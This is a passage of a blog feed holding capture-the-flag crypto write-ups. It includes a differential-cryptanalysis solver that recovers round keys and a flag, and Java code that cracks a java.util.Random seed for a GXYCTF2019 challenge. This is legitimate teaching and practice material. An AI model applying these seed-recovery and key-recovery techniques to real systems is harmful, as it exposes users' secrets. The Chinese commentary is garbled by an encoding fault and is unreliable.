put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>]))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_29_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_29_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_29[j] = key_29[j] &amp; key_29_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_29[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(key_29)</span></span><br><span class="line">    key_29 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_29])</span><br><span class="line">    print(<span class="string">"[+] KEY_29: "</span> + hex(key_29)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_29</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_28</span><span class="params">(key_31, key_30, key_29)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher2</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        cipher2[i] = (dec_one_round(cipher2[i][<span class="number">0</span>], key_31), dec_one_round(cipher2[i][<span class="number">1</span>], key_31))</span><br><span class="line">        cipher2[i] = (dec_one_round(cipher2[i][<span class="number">0</span>], key_30), dec_one_round(cipher2[i][<span class="number">1</span>], key_30))</span><br><span class="line">        cipher2[i] = (dec_one_round(cipher2[i][<span class="number">0</span>], key_29), dec_one_round(cipher2[i][<span class="number">1</span>], key_29))</span><br><span class="line">        cipher2[i+<span class="number">5</span>] = (dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">0</span>], key_31), dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">1</span>], key_31))</span><br><span class="line">        cipher2[i+<span class="number">5</span>] = (dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">0</span>], key_30), dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">1</span>], key_30))</span><br><span class="line">        cipher2[i+<span class="number">5</span>] = (dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">0</span>], key_29), dec_one_round(cipher2[i+<span class="number">5</span>][<span class="number">1</span>], key_29))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        cipher2[i] = (cipher2[i][<span class="number">0</span>], cipher2[i][<span class="number">0</span>] ^^ cipher2[i][<span class="number">1</span>])</span><br><span class="line">    key_28 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher2[i][<span class="number">0</span>], cipher2[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000022</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_28_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_28_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_28[j] = key_28[j] &amp; key_28_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_28[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher2[i][<span class="number">0</span>], cipher2[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000033</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_28_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_28_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_28[j] = key_28[j] &amp; key_28_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_28[j]) &gt; <span class="number">1</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    key_28 = get_uint32_be([list(_)[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> key_28])</span><br><span class="line">    print(<span class="string">"[+] KEY_28: "</span> + hex(key_28)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">return</span> key_28</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(enc_flag, key)</span>:</span></span><br><span class="line">    flag = <span class="string">b''</span></span><br><span class="line">    cur_key = key.copy()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>, <span class="number">3</span>, <span class="number">-1</span>):</span><br><span class="line">        cur_key = [inv_key(cur_key, i)] + cur_key[:<span class="number">3</span>]</span><br><span class="line">        key = [cur_key[<span class="number">0</span>]] + key</span><br><span class="line">    print(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc_flag), <span class="number">32</span>):</span><br><span class="line">        ct = int(enc_flag[i:i+<span class="number">32</span>], <span class="number">16</span>)</span><br><span class="line">        ct = put_uint128_be(ct)[::<span class="number">-1</span>]</span><br><span class="line">        ct = get_uint128_be(ct)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            ct = dec_one_round(ct, key[<span class="number">31</span>-j])</span><br><span class="line">        flag += long_to_bytes(ct)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"[+] ENC_FLAG: "</span> + enc_flag)</span><br><span class="line">    key_31 = crack_key_31()</span><br><span class="line">    key_30 = crack_key_30(key_31)</span><br><span class="line">    key_29 = crack_key_29(key_30)</span><br><span class="line">    key_28 = crack_key_28(key_31, key_30, key_29)</span><br><span class="line">    flag = decrypt(enc_flag, [key_28, key_29, key_30, key_31])</span><br><span class="line">    print(<span class="string">"[+] FLAG: "</span>, end=<span class="string">""</span>)</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[+] ENC_FLAG: 727c7eaf8523804472be1ff976134a65d73adba28d7345930e093b85afda0ac5b5656f7514c7736aac88a71bb6643d74</span></span><br><span class="line"><span class="string">[+] KEY_31: 0fbe90cc</span></span><br><span class="line"><span class="string">[+] KEY_30: 16c7d67f</span></span><br><span class="line"><span class="string">[+] KEY_29: 35391715</span></span><br><span class="line"><span class="string">[+] KEY_28: f28f45db</span></span><br><span class="line"><span class="string">[3882886102, 2010179002, 1572873813, 3432904981, 3427876090, 3281517115, 2835549035, 4196177867, 1356056259, 2774742866, 1808643826, 2696649042, 654419433, 3294131222, 1850743528, 2512000155, 2125249481, 1701367673, 2144276591, 2240982232, 3335194424, 4293333648, 2630048960, 3717105645, 3211860000, 304813210, 2907456674, 334588889, 4069475803, 892933909, 382195327, 264147148]</span></span><br><span class="line"><span class="string">[+] FLAG: b'flag&#123;a9028a9c58c5749cdad329c09c80cc1b&#125;\n\n\n\n\n\n\n\n\n\n'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h4 id="Link"><a href="#Link" class="headerlink" title="[Link]"></a>[Link]</h4><p><a href="https://eprint.iacr.org/2010/063.pdf" target="_blank" rel="noopener">https://eprint.iacr.org/2010/063.pdf</a></p><h3 id="flag-system"><a href="#flag-system" class="headerlink" title="flag_system"></a>flag_system</h3><h4 id="é¢˜è§£åˆ†æ-2"><a href="#é¢˜è§£åˆ†æ-2" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>é­”æ”¹md5ç¢°æ’é¢˜- -å°±åªæœ‰é•¿äº­æ‹¿äº†ä¸ªä¸€è¡€ï¼ˆä»¥åæœ‰ç©ºå†è¡¥å§</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Training-Record-2</title>
      <link href="/2020/08/12/CTF-Training-Record-2/"/>
      <url>/2020/08/12/CTF-Training-Record-2/</url>
      
        <content type="html"><![CDATA[<h3 id="GXYCTF2019-CommonModulusAttack"><a href="#GXYCTF2019-CommonModulusAttack" class="headerlink" title="GXYCTF2019 - CommonModulusAttack"></a>GXYCTF2019 - CommonModulusAttack</h3><h4 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li><a href="https://www.slideshare.net/phdays/java-35303854" target="_blank" rel="noopener">Java <code>nextInt()</code> using Truncated LCG</a></li></ul><h4 id="é¢˜ç›®æ–‡ä»¶"><a href="#é¢˜ç›®æ–‡ä»¶" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="GXYCTF2019-CMA.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>å¹¶ä¸çŸ¥é“å’Œé¢˜ç›®åå­—æœ‰ä»€ä¹ˆå…³ç³»- -</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] paramArrayOfString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CommonModulusAttack localCommonModulusAttack = <span class="keyword">new</span> CommonModulusAttack();</span><br><span class="line">  localCommonModulusAttack.oldtest();</span><br><span class="line">  localCommonModulusAttack.initseed();</span><br><span class="line">  localCommonModulusAttack.gen_states();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">    localCommonModulusAttack.lrandout();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"new.txt"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">24</span>; j++) &#123;</span><br><span class="line">      localPrintWriter.println(byte2hex(localCommonModulusAttack.lrandout()));</span><br><span class="line">    &#125;</span><br><span class="line">    localPrintWriter.close();</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p><strong>å…³é”®ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// key code (oldtest)</span></span><br><span class="line">PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"old.txt"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> j = <span class="keyword">this</span>.random.nextInt();</span><br><span class="line">  localPrintWriter.println(j);</span><br><span class="line">&#125;</span><br><span class="line">localPrintWriter.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (initseed)</span></span><br><span class="line">Scanner localScanner = <span class="keyword">new</span> Scanner(Paths.get(<span class="string">"flag"</span>, <span class="keyword">new</span> String[<span class="number">0</span>]), <span class="string">"UTF-8"</span>);</span><br><span class="line">String str1 = localScanner.next();</span><br><span class="line">String str2 = convert_2_binary(str1);</span><br><span class="line"><span class="keyword">this</span>.seed = str2; <span class="comment">// so what we need is `this.seed`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (generate_init_state)</span></span><br><span class="line">BigInteger localBigInteger = BigInteger.valueOf(<span class="number">0L</span>);</span><br><span class="line"><span class="keyword">char</span>[] arrayOfChar1 = <span class="keyword">this</span>.seed.toCharArray(); <span class="comment">// seed's first encryption</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k : arrayOfChar1) &#123;</span><br><span class="line">  localBigInteger = localBigInteger.shiftLeft(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (k == <span class="number">49</span>) &#123; <span class="comment">// k == '1'</span></span><br><span class="line">    localBigInteger = localBigInteger.xor(<span class="keyword">new</span> BigInteger(<span class="keyword">this</span>.seed, <span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (localBigInteger.shiftRight(<span class="number">256</span>) != BigInteger.ZERO) &#123;</span><br><span class="line">    localBigInteger = localBigInteger.xor(<span class="keyword">new</span> BigInteger(<span class="string">"10000000000000000000000000000000000000000000000000000000000000223"</span>, <span class="number">16</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> localBigInteger;</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (gen_states)</span></span><br><span class="line">BigInteger localBigInteger1 = generate_init_state(); <span class="comment">// what we want(seed after first encryption)</span></span><br><span class="line">BigInteger localBigInteger2 = BigInteger.valueOf(<span class="number">17L</span>); <span class="comment">// param e in RSA</span></span><br><span class="line">ArrayList localArrayList1 = <span class="keyword">new</span> ArrayList(<span class="number">24</span>);</span><br><span class="line">ArrayList localArrayList2 = <span class="keyword">new</span> ArrayList(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">  BigInteger localBigInteger3 = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random); <span class="comment">// p</span></span><br><span class="line">  BigInteger localBigInteger4 = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random); <span class="comment">// q</span></span><br><span class="line">  BigInteger localBigInteger5 = localBigInteger3.multiply(localBigInteger4); <span class="comment">// n</span></span><br><span class="line">  BigInteger localBigInteger6 = localBigInteger1.modPow(localBigInteger2, localBigInteger5); <span class="comment">// c</span></span><br><span class="line">  localArrayList1.add(localBigInteger5);</span><br><span class="line">  localArrayList2.add(localBigInteger6);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"product"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">24</span>; j++) &#123;</span><br><span class="line">    localPrintWriter.println(((BigInteger)localArrayList1.get(j)).toString());</span><br><span class="line">    <span class="keyword">this</span>.states.add(localArrayList2.get(j)); <span class="comment">// states storing seed after second encryption(RSA)</span></span><br><span class="line">  &#125;</span><br><span class="line">  localPrintWriter.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (lrandout)</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.stateselse &gt; <span class="number">0</span>) &#123; <span class="comment">// stateselse's initiation is 24</span></span><br><span class="line">  <span class="keyword">this</span>.stateselse -= <span class="number">1</span>;</span><br><span class="line">  BigInteger localBigInteger = (BigInteger)<span class="keyword">this</span>.states.get(<span class="keyword">this</span>.statespoint);</span><br><span class="line">  <span class="keyword">this</span>.statespoint += <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> stateconvert(localBigInteger); <span class="comment">// return seed after third encryption(AES)</span></span><br><span class="line">&#125; <span class="comment">// stateconvert contains `encrypt` function</span></span><br><span class="line">gen_new_states();</span><br><span class="line"><span class="keyword">return</span> lrandout();</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (gen_new_states)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">  BigInteger localBigInteger = (BigInteger)<span class="keyword">this</span>.states.get(<span class="keyword">this</span>.statespoint - <span class="number">24</span> + i); </span><br><span class="line">  <span class="keyword">byte</span>[] arrayOfByte = encrypt(localBigInteger);    </span><br><span class="line">  <span class="keyword">this</span>.states.add(<span class="keyword">new</span> BigInteger(arrayOfByte));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.stateselse += <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (encrypt)</span></span><br><span class="line">IvParameterSpec localIvParameterSpec = <span class="keyword">new</span> IvParameterSpec(<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>]);</span><br><span class="line"><span class="keyword">byte</span>[] arrayOfByte1 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">this</span>.random.nextBytes(arrayOfByte1); <span class="comment">// using random.nextBytes to genKey for AES</span></span><br><span class="line">SecretKeySpec localSecretKeySpec = <span class="keyword">new</span> SecretKeySpec(arrayOfByte1, <span class="string">"AES"</span>);</span><br><span class="line">Cipher localCipher = Cipher.getInstance(<span class="string">"AES/CBC/NoPadding"</span>);</span><br><span class="line"><span class="comment">// AES encrypt part</span></span><br></pre></td></tr></table></figure><p><strong>åŠ å¯†é“¾</strong></p><p><code>oldtest</code>å…ˆè°ƒç”¨äº†20æ¬¡javaçš„<code>nextInt()</code></p><p><code>this.seed</code>ç»è¿‡$GF(2^{256})$ä¸‹çš„å¹³æ–¹è¿ç®—åç”Ÿæˆ<code>state</code></p><p><code>state</code>é€šè¿‡RSA partç”Ÿæˆçš„24ç»„$(p,q),e=17$ï¼ŒåŠ å¯†å¾—åˆ°<code>this.states</code> (len(states == 24))</p><p><code>lrandout</code>å…ˆAES/CBCå®Œæ•´åŠ å¯†äº†ä¸€æ¬¡<code>this.states</code>çš„24ä¸ªå€¼ï¼Œ<strong>ä½†è¯¥æ¬¡å¹¶æœªæ›´æ–°<code>this.states</code></strong></p><p>ç”±äº<code>this.stateselse</code>æ­¤æ—¶ä¸º0ï¼Œå› æ­¤æ‰§è¡Œ<code>lrandout</code>ä¼šå…ˆæ–°ç”Ÿæˆ24ä¸ªstateï¼ˆå³è°ƒç”¨<code>gen_new_states</code>ï¼‰</p><p>åœ¨æ—§statesåæ–°å¢ä¸€é•¿åº¦ä¸º24çš„statesåï¼Œç”¨æ–°å¢çš„statesåŠ å¯†å¾—åˆ°çš„ç»“æœå³ä¸ºnew.txtä¸­å†…å®¹</p><p><strong>æ”»å‡»æ€è·¯</strong></p><p><img src= "/img/loading.gif" data-src="/2020/08/12/CTF-Training-Record-2/Snipaste_2020-08-17_16-13-09.png" alt></p><p>a, b, må‡å·²çŸ¥ï¼Œä¸”hidden lengthä»…ä¸º16bitsçš„Truncated LCGï¼Œç›´æ¥çˆ†ç ´PRNG_seedçš„hiddenéƒ¨åˆ†å³å¯</p><p>å¾—åˆ°PRNG_seedåï¼ŒåŠ å¯†æºç åç»­ä¸­æ‰€æœ‰ç”Ÿæˆçš„éšæœºæ•°å‡å¯é¢„æµ‹</p><p>è€Œç”¨åˆ°éšæœºæ•°ç”Ÿæˆçš„æœ‰$p,q$ç”ŸæˆåŠ$AES_Encryption$ä¸­çš„genKey</p><p>åŠ å¯†éƒ¨åˆ†æœ€åçš„ä¸¤æ¬¡<code>lrandout</code>ï¼Œå†åŠ ä¸Šå…¶ä¸­é—´çš„<code>gen_new_states</code>ï¼Œå…±è°ƒç”¨äº†ä¸‰æ¬¡<code>encrypt</code>ï¼ˆ72æ¬¡AES/CBCçš„Genkeyï¼‰</p><p>å› æ­¤æ‰€æœ‰è¿‡ç¨‹å¯æ§ï¼Œæ¢å¤å³å¯</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><p><code>SeedAttack.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SeedAttack</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> a = <span class="number">0x5deece66dL</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> b = <span class="number">11L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> m = <span class="number">0xffffffffffffL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">crack_seed</span><span class="params">(<span class="keyword">long</span> d1, <span class="keyword">long</span> d2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xffff</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">long</span> seed = (d1 &lt;&lt; <span class="number">16</span>) + i;</span><br><span class="line">            <span class="keyword">long</span> guess_d2 = (a * seed + b &amp; m) &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">            <span class="keyword">if</span> (guess_d2 == d2) &#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] PRNG's seed: "</span> + String.valueOf(seed));</span><br><span class="line">                <span class="keyword">return</span> seed;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"[!] PRNG crack failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public static void main(String[] args) &#123;</span></span><br><span class="line"><span class="comment">//        SeedAttack localSeedAttack = new SeedAttack();</span></span><br><span class="line"><span class="comment">//        long d1 = -1029728314L;</span></span><br><span class="line"><span class="comment">//        long d2 = 1487023297L;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            long seed = localSeedAttack.crack_seed(d1, d2);</span></span><br><span class="line"><span class="comment">//            System.out.println(seed);</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(e.getMessage());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CMA.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 